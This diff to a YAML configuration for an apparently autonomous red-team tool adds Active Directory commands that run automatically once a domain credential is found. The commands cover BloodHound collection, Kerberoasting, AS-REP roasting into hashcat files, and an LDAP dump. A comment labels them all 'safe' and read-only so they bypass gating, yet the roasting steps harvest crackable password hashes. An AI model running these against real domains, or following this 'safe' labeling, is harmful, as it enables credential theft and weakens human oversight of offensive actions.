@@ -10,6 +10,31 @@
 # can retrieve the right AD technique + command for the current foothold.
 ad_attacks:
   source: "Orange Cyberdefense AD mindmap v2025.03"
+  # SAFE authenticated enumeration auto-run by etl/ad_enum_followup when a DOMAIN
+  # credential is discovered (credential tagged ad_credential=true). Placeholders
+  # {domain} {user} {password} {dc_ip} are filled at run time; all read-only, so
+  # they run on the autonomous lane (offensive AD work stays in phases[], gated).
+  credentialed_enum:
+    - name: bloodhound-collection
+      tool: bloodhound-python
+      command: "bloodhound-python -d {domain} -u {user} -p '{password}' -ns {dc_ip} -c DCOnly --zip"
+      tier: safe
+      mitre: T1069.002
+    - name: kerberoast
+      tool: GetUserSPNs
+      command: "GetUserSPNs.py {domain}/{user}:{password} -dc-ip {dc_ip} -request -outputfile /tmp/kerberoast_{domain}.txt"
+      tier: safe
+      mitre: T1558.003
+    - name: asrep-roast
+      tool: GetNPUsers
+      command: "GetNPUsers.py {domain}/{user}:{password} -dc-ip {dc_ip} -request -format hashcat -outputfile /tmp/asrep_{domain}.txt"
+      tier: safe
+      mitre: T1558.004
+    - name: ldap-enum
+      tool: ldeep
+      command: "ldeep ldap -u {user} -p '{password}' -d {domain} -s ldap://{dc_ip} all /tmp/ldeep_{domain}"
+      tier: safe
+      mitre: T1087.002
   phases:
 
     - id: no_creds
